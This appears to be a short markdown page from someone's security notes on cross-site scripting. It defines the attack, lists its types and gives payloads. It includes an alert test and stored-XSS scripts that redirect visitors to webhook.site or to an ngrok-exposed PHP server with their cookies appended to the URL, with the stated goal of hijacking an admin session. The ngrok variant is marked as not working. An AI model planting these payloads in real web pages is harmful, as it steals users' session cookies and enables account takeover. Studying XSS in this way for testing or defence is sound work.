# Cross Side Scripting

Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts into a web page, which is then executed by unsuspecting users. This allows the attacker to steal data, hijack user sessions, or perform various malicious actions on the victim's behalf.

### Type of Xss

- [verify XSS]
- [stored XSS](#stored-xss)
- [reflected XSS]
- [DOM-based XSS]

## Verify XSS

```js
<script>alert(document.cookie)</script>
```

## Stored Xss

Stored Cross-Site Scripting (XSS) attacks, often referred to as "persistent XSS", are a type of web vulnerability where malicious scripts are injected and stored on a web application's server. These scripts are then served to other users who visit the affected web page.

- [steal cookie](#steal-cookie)

### Steal cookie

The idea is to infect the web page so that when a user logs in, we steal their cookies. If it's the admin, we can then take control of the website.

#### Exploit with webhook

goto [WebHook website](https://webhook.site/) to get a https to redirect users and see their cookies.

```js
<script>document.location='	https://webhook.site/...?c=' + document.cookie</script>
```

#### Exploit local server // not working 

```bash
$> php -S localhost:9999
...
$> ngrok http 9999
Forwarding                    https://58e1-89-207-171-106.ngrok-free.app -> http://localhost:9999
...
```

```js
<script>document.location='https://58e1-89-207-171-106.ngrok-free.app?c=' + document.cookie</script>
```

Then check php server to see all cookies.

---

[**:arrow_right_hook: Back home**](/README.md)
